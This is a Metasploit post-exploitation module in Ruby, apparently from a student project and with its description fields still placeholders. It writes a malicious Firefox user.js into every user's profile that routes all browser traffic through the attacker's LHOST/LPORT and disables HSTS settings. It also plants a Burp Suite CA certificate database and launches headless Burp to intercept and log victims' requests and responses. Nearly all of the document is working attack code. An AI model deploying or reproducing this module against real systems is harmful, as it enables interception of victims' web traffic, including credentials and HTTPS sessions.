##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Priv
  include Msf::Post::File
  include Msf::Post::Common

    def initialize(info={})
        super(update_info(info,
            'Name'          => '[Platform] [Module Category] [Software] [Function]',
            'Description'   => %q{
              Say something that the user might want to know.
            },
            'License'       => MSF_LICENSE,
            'Author'        => [ 'Hyun-Bum Yang' ],
            'Platform'      => [ 'win' ],
            'SessionTypes'  => [ 'meterpreter']
        ))

        register_options(
            [
                OptAddress.new('LHOST', [true, 'Address which to connect back to.']),
                OptPort.new('LPORT', [true, 'Port to receive the connection to.']),
                OptString.new('BURP_LOC', [true, 'File path to Burp Suite Java file']),
                OptString.new('BURP_NAME', [true, 'Name of the Burp Suite Java file', 'burpsuite_community_1.7.33.jar'])
            ])

        register_advanced_options(
            [
                OptString.new('REQUEST_LOG', [false, 'File path of request log', '/root/log']),
                OptString.new('RESPONSE_LOG', [false, 'File path of response log', '/root/log'])
            ])
    end

    def upload(directory)
        # Attempt to write the user.js file
        print_status("Uploading a malicious preference file at #{directory}")
        host = datastore['LHOST']
        port = datastore['LPORT']
        payload = "
user_pref(\"network.proxy.backup.ftp\", \"#{host}\");\r\n
user_pref(\"network.proxy.backup.ftp_port\", #{port});\r\n
user_pref(\"network.proxy.backup.socks\", \"#{host}\");\r\n
user_pref(\"network.proxy.backup.socks_port\", #{port});\r\n
user_pref(\"network.proxy.backup.ssl\", \"#{host}\");\r\n
user_pref(\"network.proxy.backup.ssl_port\", #{port});\r\n
user_pref(\"network.proxy.ftp\", \"#{host}\");\r\n
user_pref(\"network.proxy.ftp_port\", #{port});\r\n
user_pref(\"network.proxy.http\", \"#{host}\");\r\n
user_pref(\"network.proxy.http_port\", #{port});\r\n
user_pref(\"network.proxy.no_proxies_on\", \"\");\r\n
user_pref(\"network.proxy.share_proxy_settings\", true);\r\n
user_pref(\"network.proxy.socks\", \"#{host}\");\r\n
user_pref(\"network.proxy.socks_port\", #{port});\r\n
user_pref(\"network.proxy.ssl\", \"#{host}\");\r\n
user_pref(\"network.proxy.ssl_port\", #{port});\r\n
user_pref(\"network.proxy.type\", 1);\r\n
user_pref(\"security.mixed_content.send_hsts_priming\", false);\r\n
user_pref(\"security.mixed_content.use_hsts\", false);\r\n"
        #print_status(payload)
        res = write_file("c:\\Users\\admin\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\#{directory}\\user.js", payload)
        if res.nil?
            print_error "Upload failed"
        else
            print_good "Upload successful"
        end

        # Upload PortSwagger CA to victim
        print_status("Uploading malicious Certificate at #{directory}")
        res = upload_file("c:\\Users\\admin\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\#{directory}\\cert9.db", '/root/itp325/browser-pivot/cert9.db')
        if res.nil?
            print_error "Upload failed"
        else
            print_good "Upload successful"
        end
        print_status(" ")
    end

    def find_users()
        directory = 'c:\Users\\'
        dirs = dir(directory)
        return dirs
    end

    def buildConfig()
        payload =
"{
    \"proxy\":{
        \"request_listeners\":[
            {
                \"certificate_mode\":\"per_host\",
                \"listen_mode\":\"specific_address\",
                \"listen_specific_address\":\"#{datastore['LHOST']}\",
                \"listener_port\":#{datastore['LPORT']},
                \"running\":true
            }
        ],
	\"intercept_client_requests\":{
            \"automatically_fix_missing_or_superfluous_new_lines_at_end_of_request\":false,
            \"automatically_update_content_length_header_when_the_request_is_edited\":true,
            \"do_intercept\":true,
            \"rules\":[
                {
                    \"boolean_operator\":\"and\",
                    \"enabled\":true,
                    \"match_condition\":\"(^gif$|^jpg$|^png$|^css$|^js$|^ico$)\",
                    \"match_relationship\":\"does_not_match\",
                    \"match_type\":\"file_extension\"
                },
                {
                    \"boolean_operator\":\"and\",
                    \"enabled\":true,
                    \"match_condition\":\"^detectportal\\\\\\.firefox\\\\\\.com$\",
                    \"match_relationship\":\"does_not_match\",
                    \"match_type\":\"domain_name\"
                }
            ]
        },
        \"intercept_server_responses\":{
            \"automatically_update_content_length_header_when_the_response_is_edited\":true,
            \"do_intercept\":true,
            \"rules\":[
                {
                    \"boolean_operator\":\"or\",
                    \"enabled\":true,
                    \"match_condition\":\"text\",
                    \"match_relationship\":\"matches\",
                    \"match_type\":\"content_type_header\"
                },
                {
                    \"boolean_operator\":\"or\",
                    \"enabled\":true,
                    \"match_relationship\":\"was_intercepted\",
                    \"match_type\":\"request\"
                }
            ]
        },
	\"miscellaneous\":{
            \"disable_logging_to_history_and_site_map\":false,
            \"disable_out_of_scope_logging_to_history_and_site_map\":false,
            \"disable_web_interface\":false,
            \"remove_unsupported_encodings_from_accept_encoding_headers_in_incoming_requests\":true,
            \"set_connection_close_header_on_requests\":true,
            \"set_connection_close_header_on_responses\":false,
            \"strip_proxy_headers_in_incoming_requests\":true,
            \"strip_sec_websocket_extensions_headers_in_incoming_requests\":true,
            \"suppress_burp_error_messages_in_browser\":false,
            \"unpack_gzip_deflate_in_requests\":false,
            \"unpack_gzip_deflate_in_responses\":true,
            \"use_http_10_in_requests_to_server\":false,
            \"use_http_10_in_responses_to_client\":false
        }
    },

    \"project_options\":{
        \"misc\":{
            \"logging\":{
                \"requests\":{
                    \"all_tools\":\"\",
                    \"extender\":\"\",
                    \"intruder\":\"\",
                    \"proxy\":\"#{datastore['REQUEST_LOG']}\",
                    \"repeater\":\"\",
                    \"scanner\":\"\",
                    \"sequencer\":\"\",
                    \"spider\":\"\"
                },
                \"responses\":{
                    \"all_tools\":\"\",
                    \"extender\":\"\",
                    \"intruder\":\"\",
                    \"proxy\":\"#{datastore['RESPONSE_LOG']}\",
                    \"repeater\":\"\",
                    \"scanner\":\"\",
                    \"sequencer\":\"\",
                    \"spider\":\"\"
                }
            }
        }
    }
}"
        # Generate a config file with the given options
	print_status "Generating Config file at #{datastore['BURP_LOC']}"
        system("echo \'#{payload}\' > #{datastore['BURP_LOC']}/config.json")
    end

    def runGC()
	#Sleep for 10 sec to allow Burp to start
	sleep(10)
	system("rm #{datastore['BURP_LOC']}/config.json")
    end

    def run
        # Main method
        if is_in_admin_group?
            print_good "I am Admin!"

            output = pwd

            if output.nil? || output.empty?
                print_error "failed"
                return
            else
                print_good "#{output}"
            end

        else
            print_error "I am not Admin!"
            return
        end

        # Get all users in Users directory except "Public"
        users = find_users()
        for u in users
            if u != "." and u != ".." and u != "Public"
                # Find all the Firefox profiles
                directory = "c:\\Users\\#{u}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\"
                print_status(directory)
                if directory?(directory)
                    dirs = dir(directory)
                    if dirs.nil?
                           print_error "Something went wrong"
                    else
                           dirs.each {|a| print_status a}
                    end

                    for i in dirs
                        if i != "." and i != ".."
                            upload(i)
                            # Find a way to forward the response back to the victim
                        end
                    end
                end
            end
        end

        # Attempt to open port forwarding
        # print_status("Starting reverse port forwarding")
        # session.run_cmd("portfwd add -L #{host} -R -l #{port} -p 8080 -r 127.0.0.1")

    	# Run burp headless with the generated config file
        buildConfig()
	print_status("Start Garbage Collector")
	Thread.new{runGC()}
	print_status("Starting headless Burp")
        system("java -Djava.awt.headless=true -Xmx1g -jar #{datastore['BURP_LOC']}/#{datastore['BURP_NAME']} --config-file=#{datastore['BURP_LOC']}/config.json")

    end

end

